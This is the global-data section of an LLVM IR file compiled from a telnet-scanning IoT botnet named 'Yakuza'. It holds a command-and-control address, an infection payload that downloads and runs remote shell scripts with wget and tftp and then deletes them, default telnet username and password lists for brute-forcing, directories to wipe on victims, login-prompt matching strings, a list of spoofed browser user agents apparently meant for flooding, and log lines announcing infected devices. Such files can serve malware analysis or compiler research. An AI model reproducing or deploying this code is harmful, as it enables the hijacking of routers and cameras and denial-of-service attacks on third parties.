; ModuleID = 'host/ir_bcf/Yakuza.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [13 x i8] c"127.0.0.1:23\00", align 1
@payload = global i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [132 x i8] c"cd /tmp; wget http://127.0.0.1/bins.sh; chmod 777 *; sh bins.sh; tftp -g 127.0.0.1 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh\00", align 1
@tel_usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"support\00default\00root\00\00", align 1
@tel_passwords = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [23 x i8] c"support\00default\00admin\00\00", align 1
@tempdirs = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i8* null], align 16
@.str.18 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.26 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0), i8* null], align 16
@.str.33 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* null], align 16
@.str.43 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.51 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* null], align 16
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@uagents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.111, i32 0, i32 0)], align 16
@.str.54 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.56 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.57 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.58 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.59 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.60 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.61 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.62 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.65 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.66 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.67 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.69 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.70 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.71 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.72 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.73 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.74 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.75 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.76 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.77 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.78 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.79 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.80 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.83 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.84 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.86 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.87 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.88 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.89 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.90 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.91 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.93 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.94 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.95 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.96 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.97 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.98 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.99 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.100 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.101 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.102 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.104 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.105 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.106 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.107 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.108 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.109 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.110 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.111 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.53 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.209 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.114 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@TelnetIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.115 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.117 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.118 = private unnamed_addr constant [81 x i8] c"[ Yakuza ] Cleaning Device || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [75 x i8] c"[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
